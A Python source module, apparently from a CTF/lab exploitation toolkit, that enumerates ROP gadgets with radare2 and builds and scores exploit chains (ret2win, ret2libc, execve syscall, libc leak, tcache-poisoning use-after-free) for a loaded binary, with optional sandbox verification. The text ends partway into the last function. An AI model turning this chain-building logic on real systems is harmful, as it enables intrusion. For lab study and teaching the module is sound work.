"""Exploit Chain Analyzer: analiza el binario del laboratorio y representa las cadenas de
explotacion potenciales, desde la vulnerabilidad inicial hasta el objetivo de ejecucion.

Todo el analisis es GROUNDED en el binario cargado:
- primitivas a partir de checksec + sinks (control de RIP por overflow, pivote de RSP);
- gadgets reales enumerados con radare2 (`/Rj`), clasificados por registros que fijan, registros
  que destruyen (clobber), stack delta y efectos secundarios;
- cadenas candidatas (ret2win / ret2libc system / execve por syscall) con sus requisitos, y
  deteccion automatica de cadenas INCOMPATIBLES con la explicacion de por que fallan;
- puntuacion TECNICA (propiedades objetivas: numero de gadgets, requisitos incumplidos,
  mitigaciones que bloquean, conflictos de clobber). No es una recomendacion para atacar.

La simulacion/verificacion real (opcional, verify=True) reutiliza el sandbox de autopoc/autorop
(--network none). Todo queda restringido al binario y entorno de laboratorio cargados por el usuario.
"""
from __future__ import annotations

from dataclasses import dataclass, field
from typing import List, Optional

# registros de argumentos SysV x86-64 (orden de llamada) + los relevantes para syscalls
_ARG_REGS = ["rdi", "rsi", "rdx", "rcx", "r8", "r9"]
_SYS_EXECVE = 0x3b

# tipos de opcode que rompen un gadget limpio si aparecen antes del terminador
_BRANCHY = {"cjmp", "jmp", "ujmp", "call", "ucall", "rcall", "ccall", "invalid", "ill"}
# tipos que solo mueven datos sin efecto colateral sorpresa
_BENIGN = {"pop", "ret", "nop", "mov", "syscall", "leave", "xor", "push"}


@dataclass
class Gadget:
    addr: int = 0
    insns: List[str] = field(default_factory=list)
    sets: List[str] = field(default_factory=list)       # regs cargados desde el stack (pop reg)
    clobbers: List[str] = field(default_factory=list)   # otros regs escritos
    stack_delta: int = 0                                 # bytes que consume del stack (incl. ret)
    kind: str = "other"                                  # pop|syscall|pivot|ret|write|other
    side_effects: str = ""

    @property
    def text(self) -> str:
        return "; ".join(self.insns)


@dataclass
class ChainStep:
    kind: str = "gadget"       # vuln|primitive|control|gadget|target
    label: str = ""
    detail: str = ""
    addr: Optional[int] = None
    regs: dict = field(default_factory=dict)   # estado de registros que la cadena FIJA tras el paso
    stack: str = ""
    constraints: str = ""


@dataclass
class ExploitChain:
    name: str = ""
    target: str = ""
    steps: List[ChainStep] = field(default_factory=list)
    requirements: List[str] = field(default_factory=list)
    regs_needed: List[str] = field(default_factory=list)
    gadgets_used: List[int] = field(default_factory=list)
    constraints: List[str] = field(default_factory=list)
    mitigations: List[str] = field(default_factory=list)
    break_points: List[str] = field(default_factory=list)
    feasible: bool = False
    unmet_requirements: int = 0                 # requisitos [X] (para decidir si INTENTAR verificar)
    score: int = 0
    score_detail: dict = field(default_factory=dict)
    sim_result: str = "no simulada"
    verified: bool = False                     # probado por ejecucion en sandbox
    proof: dict = field(default_factory=dict)  # {strategy, offset, base, win, marker, output}


@dataclass
class ChainAnalysis:
    arch: str = "x86_64"
    lang: str = "es"
    primitives: List[str] = field(default_factory=list)
    control: dict = field(default_factory=dict)   # {RIP, RSP_pivot, regs:[...]}
    target: str = ""
    gadgets: List[Gadget] = field(default_factory=list)
    chains: List[ExploitChain] = field(default_factory=list)
    graph: dict = field(default_factory=dict)
    note: str = ""

    @property
    def ok(self) -> bool:
        return bool(self.chains)


def _classify(raw: dict) -> Optional[Gadget]:
    """Convierte un gadget crudo de r2 (/Rj) en un Gadget clasificado. Devuelve None si no es
    utilizable (ramas/llamadas intermedias o terminador no valido)."""
    ops = raw.get("opcodes", [])
    if not ops:
        return None
    last = ops[-1]
    lt = last.get("type", "")
    if lt not in ("ret", "syscall") and "ret" not in last.get("opcode", ""):
        return None
    sets, clobbers, side = [], [], []
    stack_delta = 8 if lt == "ret" else 0   # el ret consume la direccion de retorno
    for op in ops[:-1]:
        t = op.get("type", "")
        txt = (op.get("opcode", "") or "").strip()
        if t in _BRANCHY:
            return None                      # gadget sucio: no utilizable
        parts = txt.replace(",", " ").split()
        mn = parts[0] if parts else ""
        if mn == "pop" and len(parts) >= 2:
            reg = parts[1]
            sets.append(reg)
            stack_delta += 8
        elif mn == "add" and len(parts) >= 3 and parts[1] == "rsp":
            try:
                stack_delta += int(parts[2], 0)
            except ValueError:
                pass
            side.append(txt)
        elif mn in ("mov", "xor", "lea") and len(parts) >= 2:
            clobbers.append(parts[1])
        elif mn == "leave":
            side.append("leave (rsp<-rbp; pop rbp): pivote de stack")
        elif t not in _BENIGN:
            side.append(txt)
    kind = "ret"
    joined = " ".join((o.get("opcode", "") or "") for o in ops)
    if "syscall" in joined:
        kind = "syscall"
    elif "leave" in joined or any("pop rsp" in (o.get("opcode", "") or "") for o in ops):
        kind = "pivot"
    elif sets:
        kind = "pop"
    elif any(o.get("opcode", "").startswith("mov ") and "[" in o.get("opcode", "") for o in ops):
        kind = "write"
    # la direccion del gadget es la de su PRIMERA instruccion (la que va en la pila del ROP),
    # no el `retaddr` (que apunta al ret final). r2 usa la clave "offset" en cada opcode.
    entry = ops[0].get("offset", ops[0].get("addr", raw.get("retaddr", 0)))
    return Gadget(addr=entry,
                  insns=[o.get("opcode", "") for o in ops],
                  sets=sets, clobbers=[c for c in clobbers if c not in sets],
                  stack_delta=stack_delta, kind=kind, side_effects="; ".join(side))


def _best_for(gadgets: List[Gadget], reg: str) -> Optional[Gadget]:
    """El mejor gadget para fijar `reg`: el que hace `pop reg` con menos ruido (menos clobber,
    menor stack delta, sin efectos secundarios)."""
    cands = [g for g in gadgets if reg in g.sets]
    if not cands:
        return None
    return sorted(cands, key=lambda g: (len(g.clobbers), bool(g.side_effects), g.stack_delta,
                                        len(g.sets)))[0]


def _enum_gadgets(binary: str) -> List[Gadget]:
    """Enumera y clasifica gadgets reales del binario con radare2 (`/Rj`). Busca patrones utiles
    para control de registros de argumentos, syscall y pivote. Best-effort; [] si no hay r2."""
    out: List[Gadget] = []
    seen = set()
    try:
        import json
        from ..oracles.r2session import get as _r2get
        r = _r2get(binary)
        if r is None:
            return out
        patterns = (["pop " + reg for reg in _ARG_REGS + ["rax", "rbx", "rbp", "rsp"]]
                    + ["syscall", "leave", "int 0x80"])
        for pat in patterns:
            try:
                raws = json.loads(r.cmd(f"/Rj {pat}") or "[]")
            except Exception:
                raws = []
            for raw in raws[:40]:
                g = _classify(raw)
                if g and g.addr not in seen:
                    seen.add(g.addr)
                    out.append(g)
    except Exception:
        return out
    return out


def _facts(binary: str, reg=None) -> dict:
    """Hechos del binario: mitigaciones, win(), system(), /bin/sh, offset de control de RIP.
    Lee con r2 directo (r2pipe). El parametro `reg` se acepta por consistencia de firma con el
    resto de workflows pero no se usa aqui."""
    f = {"canary": None, "pie": None, "nx": None, "arch": "x86_64",
         "win": None, "system": None, "binsh": None, "rip_offset": None,
         "puts": False, "leak_fn": None, "reenter": False, "heap_shell_ok": False}
    try:
        import json
        import re as _re
        from ..oracles.r2session import get as _r2get
        r = _r2get(binary)
        if r is not None:
            info = json.loads(r.cmd("ij") or "{}").get("bin", {})
            f["canary"] = info.get("canary")
            f["pie"] = info.get("pic")
            f["nx"] = info.get("nx")
            f["arch"] = f"{info.get('arch','x86')}_{info.get('bits',64)}"
            # limite de palabra (no letra ADYACENTE): sin el, "win" hacia match dentro de
            # "_unwind_resume" (el runtime de excepciones de C++/libgcc_s) -- confirmado con un
            # binario real que usa try/catch: se marcaba _Unwind_Resume como la funcion 'win()' del
            # reto, fabricando un objetivo de ret2win que no existe.
            _gift_re = _re.compile(r"(?<![a-z])(win|shell|backdoor|giveshell)(?![a-z])")
            fn_names = set()
            for fn in json.loads(r.cmd("aflj") or "[]"):
                nm = fn.get("name", "").lower()
                fn_names.add(nm)
                if f["win"] is None and _gift_re.search(nm):
                    f["win"] = fn.get("offset")
                if f["system"] is None and nm.endswith("system"):
                    f["system"] = fn.get("offset")
            # imports para la cadena de fuga (leak): puts/printf permiten filtrar una direccion de
            # libc. Nombres de import REALES via iij (no substring sobre un grep de texto: "puts" in
            # texto tambien matcheaba "fputs", marcando puts() como presente cuando solo hay fputs).
            imp_names = set()
            for imp in json.loads(r.cmd("iij") or "[]"):
                nm2 = (imp.get("name") or "").lower()
                imp_names.add(nm2.rsplit(".", 1)[-1] if "." in nm2 else nm2)
            f["puts"] = "puts" in imp_names
            f["leak_fn"] = "puts" if f["puts"] else ("printf" if "printf" in imp_names else None)
            # punto de reentrada: coincidencia EXACTA de nombre de funcion, no substring de un grep
            # (antes, "main" in texto tambien matcheaba funciones como getdomainname/remainder_calc,
            # o simplemente el nombre de la propia consulta de grep repetido en la salida).
            f["reenter"] = bool(fn_names & {"main", "sym.main", "vuln", "sym.vuln"})
            # /bin/sh en strings
            for s in json.loads(r.cmd("izzj") or "{}").get("strings", []):
                if "/bin/sh" in (s.get("string", "") or ""):
                    f["binsh"] = s.get("vaddr"); break
    except Exception:
        pass
    # offset de control de RIP (reutiliza el detector estatico de autopoc)
    try:
        from .autopoc import _static_offset, find_win
        f["rip_offset"] = _static_offset(binary)
        if f["win"] is None:
            f["win"] = find_win(binary)
    except Exception:
        pass
    # aplicabilidad del driver de heap (tcache-UAF -> free@GOT=win): reutiliza el chequeo barato
    # de autoheap.py (simbolos win + free) en vez de duplicar la logica de elftools aqui.
    try:
        from .autoheap import _heap_shell_applicable
        f["heap_shell_ok"] = _heap_shell_applicable(binary)
    except Exception:
        pass
    return f


# bytes prohibidos por sink de entrada (el terminador del sink corta el payload ahi)
_SINK_BADCHARS = {
    "gets": {0x0a}, "fgets": {0x0a}, "gets_s": {0x0a},
    "scanf": {0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x20}, "isoc99_scanf": {0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x20},
    "strcpy": {0x00}, "strncpy": {0x00}, "strcat": {0x00}, "sprintf": {0x00}, "stpcpy": {0x00},
    "read": set(), "fread": set(), "recv": set(), "recvfrom": set(),   # binario-safe
}
# prioridad para elegir el sink que gobierna los bad-chars (el mas restrictivo relevante)
_SINK_ORDER = ("scanf", "isoc99_scanf", "gets", "fgets", "gets_s", "strcpy", "strncpy", "strcat",
               "sprintf", "stpcpy", "read", "fread", "recv", "recvfrom")


def _overflow_sink(binary: str):
    """Sink de entrada de la funcion vulnerable (el que gobierna los bad-chars). Devuelve el nombre
    o None. Busca la funcion que llama a un sink de lectura y toma el mas restrictivo presente."""
    try:
        import json
        import re as _re
        from ..oracles.r2session import get as _r2get
        r = _r2get(binary)
        if r is None:
            return None
        present = set()
        for fn in json.loads(r.cmd("aflj") or "[]"):
            nm = fn.get("name", "")
            dis = r.cmd(f"pdf @ {nm}") or ""
            for s in _SINK_ORDER:
                # \b (limite de palabra) en vez de substring: sin el, "gets" hacia match dentro de
                # "sym.imp.getsockopt"/"call getsockopt" -- confirmado con un binario real que solo
                # llama a getsockopt(), donde se fabricaban badchars de gets() (0x0a prohibido) que
                # no aplican, degradando o rompiendo candidatos de cadena validos.
                if _re.search(rf"\b{_re.escape(s)}\b", dis):
                    present.add(s)
        for s in _SINK_ORDER:            # el primero por prioridad manda
            if s in present:
                return s
    except Exception:
        return None
    return None


def _sig_bytes(addr):
    """Bytes significativos (little-endian, sin ceros altos de relleno) de una direccion."""
    if not isinstance(addr, int) or addr <= 0:
        return []
    out = []
    v = addr
    while v > 0:
        out.append(v & 0xff)
        v >>= 8
    return out


def _bad_in(addr, badset):
    return sorted({b for b in _sig_bytes(addr) if b in badset})


def _apply_badchars(chain: "ExploitChain", addrs, badset, sink: str, lang: str) -> None:
    """Marca break-points si alguna direccion de la cadena contiene un byte prohibido por el sink."""
    if not badset:
        return
    es = lang == "es"
    for a in addrs:
        bad = _bad_in(a, badset)
        if bad:
            bstr = ", ".join(hex(b) for b in bad)
            chain.break_points.append(
                (f"La direccion {hex(a)} contiene byte(s) prohibido(s) {bstr}: el sink de entrada "
                 f"`{sink}` corta el payload ahi, asi que esa direccion no se puede escribir tal cual "
                 "(hace falta stack pivot, otra gadget/direccion, o partial overwrite)." if es else
                 f"Address {hex(a)} contains forbidden byte(s) {bstr}: the input sink `{sink}` "
                 "truncates the payload there, so that address cannot be written as-is (needs a "
                 "stack pivot, a different gadget/address, or a partial overwrite)."))


def _score(chain: ExploitChain) -> None:
    """Puntuacion TECNICA (0-100) por propiedades objetivas. No es recomendacion de ataque."""
    unmet = sum(1 for r in chain.requirements if r.startswith("[X]"))
    chain.unmet_requirements = unmet
    blockers = len(chain.break_points)
    ng = len(chain.gadgets_used)
    conflicts = sum(1 for c in chain.constraints if "conflicto" in c.lower() or "conflict" in c.lower())
    s = 100 - 8 * ng - 25 * unmet - 12 * blockers - 6 * conflicts
    chain.score = max(0, min(100, s))
    chain.score_detail = {"gadgets": ng, "requisitos_incumplidos": unmet,
                          "puntos_de_rotura": blockers, "conflictos_clobber": conflicts}
    chain.feasible = (unmet == 0 and blockers == 0)


def _should_attempt_verify(c: ExploitChain, f: dict) -> bool:
    """Decide si merece la pena INTENTAR la verificacion real en sandbox (no solo si la cadena es
    'feasible' en el sentido estatico/teorico). BUG que arregla: `c.feasible` tambien exige CERO
    break_points, y _mitig_breakpoints() anade un break_point de PIE ('direcciones aleatorias, la
    cadena se rompe sin fuga') a CUALQUIER cadena de direccion fija en un binario PIE -- pero los
    verificadores de autopie.py (autopie_ret2win/autopie_rop) EXISTEN precisamente para ese caso:
    resuelven la base real en el sandbox (ASLR off) sin necesitar ninguna fuga. Con el gate
    anterior (`c.feasible`), esos verificadores YA FUNCIONABAN si se llamaban directamente, pero
    `analyze_chains()` nunca los intentaba en NINGUN binario PIE -- confirmado con ret2win_pie:
    autopie_ret2win() por si solo verifica en ~unos segundos, pero la cadena salia
    'feasible=False' por el break_point de PIE y _verify_chain() nunca se invocaba.
    El canary SI sigue bloqueando el intento (ningun driver hace bypass de canary por fuerza
    bruta; intentarlo solo gastaria tiempo de sandbox en un fallo casi seguro)."""
    if c.unmet_requirements != 0:
        return False
    if f.get("canary") is True:
        return False
    return True


def _req(met: bool, es: str, en: str, lang: str) -> str:
    """Linea de requisito con marcador NEUTRO de idioma ([OK]/[X]) para el scoring + texto bilingue."""
    return ("[OK] " if met else "[X] ") + (es if lang == "es" else en)


def _mitig_breakpoints(f: dict, uses_fixed_addr: bool, lang: str) -> (List[str], List[str]):
    """Mitigaciones relevantes y puntos de rotura que introducen para una cadena de overflow."""
    es = lang == "es"
    mit, brk = [], []
    if f.get("canary") is True:
        mit.append("Stack canary ACTIVO" if es else "Stack canary ON")
        brk.append("Canary activo: el overflow lineal se detecta antes de retornar; la cadena se "
                   "rompe salvo que exista una fuga del canary." if es else
                   "Canary on: a linear overflow is detected before return; the chain breaks unless a "
                   "canary leak exists.")
    if f.get("pie") is True and uses_fixed_addr:
        mit.append("PIE ACTIVO" if es else "PIE ON")
        brk.append("PIE activo: las direcciones (win/gadgets/system/'/bin/sh') son aleatorias; la "
                   "cadena se rompe sin una fuga de direccion (leak)." if es else
                   "PIE on: addresses (win/gadgets/system/'/bin/sh') are randomized; the chain breaks "
                   "without an address leak.")
    if f.get("nx") is True:
        mit.append("NX ACTIVO (no shellcode; la via es ROP)" if es else "NX ON (no shellcode; ROP is the path)")
    return mit, brk


def analyze_chains(binary: str, reg=None, verify: bool = False, lang: str = "es") -> ChainAnalysis:
    es = lang == "es"
    f = _facts(binary, reg)
    gadgets = _enum_gadgets(binary)
    an = ChainAnalysis(arch=f["arch"], gadgets=gadgets)
    L = (lambda a, b: a) if es else (lambda a, b: b)
    # bad-chars gobernados por el sink de entrada (no-PIE: direcciones fijas comprobables)
    _sink = _overflow_sink(binary)
    _badset = _SINK_BADCHARS.get(_sink, set()) if (_sink and f.get("pie") is not True) else set()

    # --- primitivas y control (tecnico) ---
    rip = f.get("rip_offset") is not None or f.get("win") is not None
    reg_control = sorted({r for g in gadgets for r in g.sets})
    # mejor gadget por registro controlable (direccion + stack delta) para el detalle tecnico
    reg_gadgets = {}
    for rc in reg_control:
        g = _best_for(gadgets, rc)
        if g:
            reg_gadgets[rc] = {"addr": hex(g.addr), "delta": g.stack_delta, "text": g.text}
    pivot_g = next((g for g in gadgets if g.kind == "pivot"), None)
    pivot = pivot_g is not None
    _off = f.get("rip_offset")
    bits = 64 if "64" in an.arch else 32
    wsz = bits // 8
    if rip:
        if _off is not None:
            an.primitives.append(L(
                f"Control de RIP por desbordamiento lineal de pila: offset {_off} B hasta la direccion "
                f"de retorno guardada (buffer local + RBP salvado de {wsz} B); el qword en [RSP] tras el "
                f"epilogo `leave; ret` se sobrescribe con el destino. SysV AMD64, alineacion {wsz} B.",
                f"RIP control via linear stack overflow: {_off} B offset to the saved return address "
                f"(local buffer + saved RBP {wsz} B); the qword at [RSP] after the `leave; ret` epilogue "
                f"is overwritten with the target. SysV AMD64, {wsz} B alignment."))
        else:
            an.primitives.append(L("Control de RIP por desbordamiento de pila (offset por determinar)",
                                   "RIP control via stack overflow (offset to be determined)"))
    if reg_gadgets:
        det = ", ".join(f"{r.upper()} @ {reg_gadgets[r]['addr']} (delta {reg_gadgets[r]['delta']} B)"
                        for r in reg_control if r in reg_gadgets)
        an.primitives.append(L(
            "Control de registros (convencion SysV AMD64: 1os args en RDI, RSI, RDX, RCX, R8, R9) "
            "via gadgets `pop reg; ret`: " + det,
            "Register control (SysV AMD64 convention: first args in RDI, RSI, RDX, RCX, R8, R9) via "
            "`pop reg; ret` gadgets: " + det))
    if pivot_g:
        an.primitives.append(L(
            f"Pivote de RSP disponible: `{pivot_g.text}` @ {hex(pivot_g.addr)} (redirige el marco de "
            "pila hacia datos controlados, util con overflow corto).",
            f"RSP pivot available: `{pivot_g.text}` @ {hex(pivot_g.addr)} (redirects the stack frame to "
            "controlled data, useful with a short overflow)."))
    an.control = {"RIP": rip, "RSP_pivot": pivot, "regs": reg_control,
                  "rip_offset": _off, "arch_bits": bits, "word": wsz,
                  "reg_gadgets": reg_gadgets,
                  "pivot_gadget": (hex(pivot_g.addr) if pivot_g else None)}
    an.target = ("execve('/bin/sh')" if (f.get("system") or f.get("binsh")) else
                 ("win()" if f.get("win") is not None else L("control de flujo", "control flow")))

    ovf = L("Desbordamiento de pila", "Stack overflow")
    ripc = L("Control de RIP", "RIP control")
    chains: List[ExploitChain] = []

    # 1) ret2win: overflow -> win()
    c = ExploitChain(name="ret2win", target="win()")
    has_win = f.get("win") is not None
    c.requirements = [
        _req(rip, "control de RIP (offset de retorno)", "RIP control (return offset)", lang),
        _req(has_win, "funcion objetivo win()/giveshell en el binario",
             "target function win()/giveshell in the binary", lang)]
    c.regs_needed = []
    c.mitigations, c.break_points = _mitig_breakpoints(f, True, lang)
    winaddr = f.get("win") or 0
    c.steps = [
        ChainStep("vuln", ovf, L("Entrada sin acotar sobre buffer local", "Unbounded input into a local buffer"),
                  stack=L("se sobrescribe hasta la direccion de retorno guardada",
                          "overwrites up to the saved return address")),
        ChainStep("primitive", ripc,
                  (f"offset={f.get('rip_offset')}" if f.get("rip_offset") is not None
                   else L("offset por determinar", "offset to be determined")),
                  regs={"rip": L("controlado", "controlled")},
                  stack=L("RIP = siguiente qword tras el offset", "RIP = next qword after the offset")),
        ChainStep("target", "win()",
                  (L(f"salta a win() en {hex(winaddr)}", f"jumps to win() at {hex(winaddr)}") if has_win
                   else L("requiere win()", "requires win()")),
                  addr=winaddr or None, regs={"rip": hex(winaddr) if has_win else "?"},
                  constraints=L("alinear el stack (16B) con un gadget `ret` si win() llama a system",
                                "align the stack (16B) with a `ret` gadget if win() calls system"))]
    _apply_badchars(c, [f.get("win")] if f.get("win") else [], _badset, _sink, lang)
    _score(c)
    if verify and _should_attempt_verify(c, f):
        c.sim_result, c.verified, c.proof = _verify_chain(binary, "ret2win", f, lang)
    chains.append(c)

    # 2) ret2libc: overflow -> pop rdi; ret -> system('/bin/sh')
    c = ExploitChain(name="ret2libc system", target="system('/bin/sh')")
    g_rdi = _best_for(gadgets, "rdi")
    has_sys, has_binsh = f.get("system") is not None, f.get("binsh") is not None
    c.requirements = [
        _req(rip, "control de RIP", "RIP control", lang),
        _req(bool(g_rdi), "gadget `pop rdi; ret` (1er argumento)", "gadget `pop rdi; ret` (1st argument)", lang),
        _req(has_sys, "system() en PLT/simbolos", "system() in PLT/symbols", lang),
        _req(has_binsh, "cadena '/bin/sh' en el binario", "'/bin/sh' string in the binary", lang)]
    c.regs_needed = ["rdi"]
    c.mitigations, c.break_points = _mitig_breakpoints(f, True, lang)
    if g_rdi:
        c.gadgets_used = [g_rdi.addr]
        if g_rdi.clobbers:
            c.constraints.append(L("posible conflicto de clobber: ", "possible clobber conflict: ")
                                 + ", ".join(g_rdi.clobbers))
        if g_rdi.side_effects:
            c.constraints.append(L("efecto secundario del gadget rdi: ", "rdi gadget side effect: ")
                                 + g_rdi.side_effects)
    c.steps = [
        ChainStep("vuln", ovf, L("controla la direccion de retorno", "controls the return address")),
        ChainStep("primitive", ripc, regs={"rip": L("controlado", "controlled")}),
        ChainStep("gadget", "pop rdi; ret", g_rdi.text if g_rdi else L("AUSENTE", "ABSENT"),
                  addr=g_rdi.addr if g_rdi else None, regs={"rdi": "&'/bin/sh'"},
                  stack=f"delta={g_rdi.stack_delta}B" if g_rdi else "",
                  constraints=((g_rdi.side_effects or L("sin efectos secundarios", "no side effects")) if g_rdi
                               else L("gadget ausente", "gadget absent"))),
        ChainStep("target", "system('/bin/sh')",
                  (L(f"system en {hex(f['system'])}", f"system at {hex(f['system'])}") if has_sys
                   else L("requiere system()", "requires system()")),
                  addr=f.get("system"), regs={"rdi": "&'/bin/sh'"})]
    _apply_badchars(c, [a for a in [g_rdi.addr if g_rdi else None, f.get("system"), f.get("binsh")] if a],
                    _badset, _sink, lang)
    _score(c)
    if verify and _should_attempt_verify(c, f):
        c.sim_result, c.verified, c.proof = _verify_chain(binary, "ret2libc", f, lang)
    chains.append(c)

    # 3) execve por syscall: pop rax=59; pop rdi=&/bin/sh; pop rsi=0; pop rdx=0; syscall
    c = ExploitChain(name="execve syscall", target="execve('/bin/sh',0,0)")
    need = {"rax": _best_for(gadgets, "rax"), "rdi": _best_for(gadgets, "rdi"),
            "rsi": _best_for(gadgets, "rsi"), "rdx": _best_for(gadgets, "rdx")}
    g_sys = next((g for g in gadgets if g.kind == "syscall"), None)
    has_binsh = f.get("binsh") is not None
    c.requirements = [_req(rip, "control de RIP", "RIP control", lang)]
    for rname in ("rax", "rdi", "rsi", "rdx"):
        c.requirements.append(_req(bool(need[rname]), f"gadget `pop {rname}; ret`", f"gadget `pop {rname}; ret`", lang))
    c.requirements.append(_req(bool(g_sys), "gadget `syscall`", "gadget `syscall`", lang))
    c.requirements.append(_req(has_binsh, "cadena '/bin/sh' (o escribible en .bss)",
                               "'/bin/sh' string (or writable in .bss)", lang))
    c.regs_needed = ["rax", "rdi", "rsi", "rdx"]
    c.mitigations, c.break_points = _mitig_breakpoints(f, True, lang)
    c.gadgets_used = [g.addr for g in list(need.values()) + [g_sys] if g]
    for rname, g in need.items():
        if g and g.clobbers:
            other = [x for x in g.clobbers if x in c.regs_needed and x != rname]
            if other:
                c.constraints.append(L(f"conflicto de clobber en pop {rname}: destruye {', '.join(other)}",
                                       f"clobber conflict in pop {rname}: destroys {', '.join(other)}"))
    c.steps = [ChainStep("vuln", ovf),
               ChainStep("primitive", ripc, regs={"rip": L("controlado", "controlled")})]
    vals = {"rax": L("59 (execve)", "59 (execve)"), "rdi": "&'/bin/sh'", "rsi": "0", "rdx": "0"}
    setregs = {}
    for rname in ("rax", "rdi", "rsi", "rdx"):
        g = need[rname]
        setregs = dict(setregs); setregs[rname] = vals[rname]
        c.steps.append(ChainStep("gadget", f"pop {rname}; ret", g.text if g else L("AUSENTE", "ABSENT"),
                                 addr=g.addr if g else None, regs=dict(setregs),
                                 stack=f"delta={g.stack_delta}B" if g else "",
                                 constraints=((g.side_effects or L("limpio", "clean")) if g
                                              else L("gadget ausente", "gadget absent"))))
    c.steps.append(ChainStep("target", "syscall -> execve", g_sys.text if g_sys else L("syscall AUSENTE", "syscall ABSENT"),
                             addr=g_sys.addr if g_sys else None, regs=dict(setregs)))
    _apply_badchars(c, [g.addr for g in list(need.values()) + [g_sys] if g]
                    + ([f["binsh"]] if f.get("binsh") else []), _badset, _sink, lang)
    _score(c)
    if verify and _should_attempt_verify(c, f):
        c.sim_result, c.verified, c.proof = _verify_chain(binary, "execve", f, lang)
    chains.append(c)

    # 4) ret2libc + leak (2 ETAPAS): binario dinamico con NX, sin win ni system estatico. Fase 1
    #    filtra una direccion de libc (puts@GOT via puts@PLT) y reentra; fase 2 usa la base de libc
    #    para llamar system('/bin/sh'). Solo tiene sentido si NO hay una via mas simple (win/system).
    if f.get("puts") and f.get("system") is None and f.get("win") is None:
        c = ExploitChain(name="ret2libc + leak", target="system('/bin/sh') via libc")
        g_rdi = _best_for(gadgets, "rdi")
        lk = f.get("leak_fn") or "puts"
        c.requirements = [
            _req(rip, "control de RIP", "RIP control", lang),
            _req(bool(g_rdi), "gadget `pop rdi; ret`", "gadget `pop rdi; ret`", lang),
            _req(f.get("puts"), f"`{lk}` en PLT/GOT (para filtrar libc)", f"`{lk}` in PLT/GOT (to leak libc)", lang),
            _req(f.get("reenter"), "punto de reentrada (main/vuln) para la 2a etapa",
                 "reentry point (main/vuln) for stage 2", lang),
            _req(True, "libc del objetivo (offsets de system y '/bin/sh')",
                 "target libc (system and '/bin/sh' offsets)", lang)]
        c.regs_needed = ["rdi"]
        c.mitigations, c.break_points = _mitig_breakpoints(f, False, lang)  # direcciones de libc en runtime
        if g_rdi:
            c.gadgets_used = [g_rdi.addr]
        c.steps = [
            ChainStep("vuln", ovf, L("controla la direccion de retorno", "controls the return address")),
            ChainStep("primitive", ripc, regs={"rip": L("controlado", "controlled")}),
            ChainStep("gadget", f"[fase 1] pop rdi; {lk}@PLT",
                      L(f"filtra {lk}@GOT para calcular la base de libc y reentra en main",
                        f"leaks {lk}@GOT to compute the libc base and reenters main"),
                      addr=g_rdi.addr if g_rdi else None,
                      regs={"rdi": f"{lk}@GOT"}, stack=L("reentra: 2a etapa", "reenter: stage 2"),
                      constraints=L("necesita la libc exacta para los offsets", "needs the exact libc for offsets")),
            ChainStep("gadget", "[fase 2] pop rdi; system",
                      L("con la base de libc: rdi=&'/bin/sh', llama a system", "with libc base: rdi=&'/bin/sh', call system"),
                      regs={"rdi": "&'/bin/sh' (libc)"} ),
            ChainStep("target", "system('/bin/sh')",
                      L("shell via libc rebaseada", "shell via rebased libc"),
                      regs={"rip": "system@libc"})]
        _score(c)
        if verify and _should_attempt_verify(c, f):
            c.sim_result, c.verified, c.proof = _verify_chain(binary, "ret2libc_leak", f, lang)
        chains.append(c)

    # 5) heap UAF -> tcache poison -> free@GOT=win(): binario menu-driven (new/free/edit/show) con
    # una funcion gift y free@GOT escribible. Antes de este bloque, autoheap_shell() (el driver que
    # de verdad hace el poisoning) EXISTIA y FUNCIONABA de forma standalone, pero nunca se llamaba
    # desde aqui -- classify_binary() marcaba estos binarios como 'uaf' correctamente, pero
    # analyze_chains() nunca intentaba verificarlos: se quedaban en 'plantilla, no verificada' para
    # siempre. Confirmado end-to-end: heapexp (que cumple heap_shell_ok) verifica con exito.
    if f.get("heap_shell_ok"):
        c = ExploitChain(name="uaf tcache-poison", target="win() via free@GOT overwrite")
        c.requirements = [
            _req(f.get("win") is not None, "funcion objetivo win()/giveshell en el binario",
                 "target function win()/giveshell in the binary", lang),
            _req(True, "simbolos win + free (heap menu-driven: new/free/edit/show)",
                 "win + free symbols (menu-driven heap: new/free/edit/show)", lang),
            _req(f.get("pie") is not True, "free@GOT en direccion fija (no-PIE)",
                 "free@GOT at a fixed address (non-PIE)", lang)]
        c.mitigations, c.break_points = _mitig_breakpoints(f, True, lang)
        c.steps = [
            ChainStep("vuln", L("Use-after-free / doble free", "Use-after-free / double free"),
                      L("el menu permite reusar un chunk liberado (new/free/edit/show)",
                        "the menu allows reusing a freed chunk (new/free/edit/show)")),
            ChainStep("primitive", L("Fuga de la clave de safe-linking", "Safe-linking key leak"),
                      L("free(0) en bin vacio -> fd=mangle(NULL)=(&chunk>>12); show(0) filtra la clave",
                        "free(0) into an empty bin -> fd=mangle(NULL)=(&chunk>>12); show(0) leaks the key")),
            ChainStep("gadget", "tcache poison",
                      L("free(1); free(0); edit(0, key^free_got): fd del chunk 0 = mangle(free@GOT)",
                        "free(1); free(0); edit(0, key^free_got): chunk 0's fd = mangle(free@GOT)"),
                      constraints=L("necesita reparar el vecino de free@GOT+8 (zeroed por tcache key-clear)",
                                    "needs repairing free@GOT+8's neighbor (zeroed by tcache key-clear)")),
            ChainStep("target", "free@GOT = win()",
                      L("malloc devuelve free@GOT; se escribe win() ahi; el siguiente free() lo dispara",
                        "malloc returns free@GOT; win() is written there; the next free() triggers it"),
                      addr=f.get("win"), regs={"rip": hex(f["win"]) if f.get("win") else "?"})]
        _score(c)
        if verify and _should_attempt_verify(c, f):
            c.sim_result, c.verified, c.proof = _verify_chain(binary, "uaf_tcache", f, lang)
        chains.append(c)

    # sim_result por defecto (bilingue) para las no simuladas
    for ch in chains:
        if ch.sim_result == "no simulada":
            ch.sim_result = L("no simulada", "not simulated")
    # orden: factibles primero, luego por puntuacion tecnica
    # orden: VERIFICADAS primero (prueba real), luego factibles, luego por puntuacion tecnica
    chains.sort(key=lambda x: (not x.verified, not x.feasible, -x.score))
    an.chains = chains
    an.lang = lang
    an.graph = _build_graph(an)
    if not gadgets:
        an.note = L("sin gadgets enumerados (binario pequeno/dinamico); el analisis se basa en primitivas.",
                    "no gadgets enumerated (small/dynamic binary); the analysis relies on primitives.")
    return an


def _build_graph(an: ChainAnalysis) -> dict:
    """Grafo del explorador: nodo por primitiva/gadget/estado, arista por transicion. Nodo raiz
    de vulnerabilidad compartido y nodo objetivo compartido por objetivo igual."""
    nodes, edges = [], []
    ids = {}

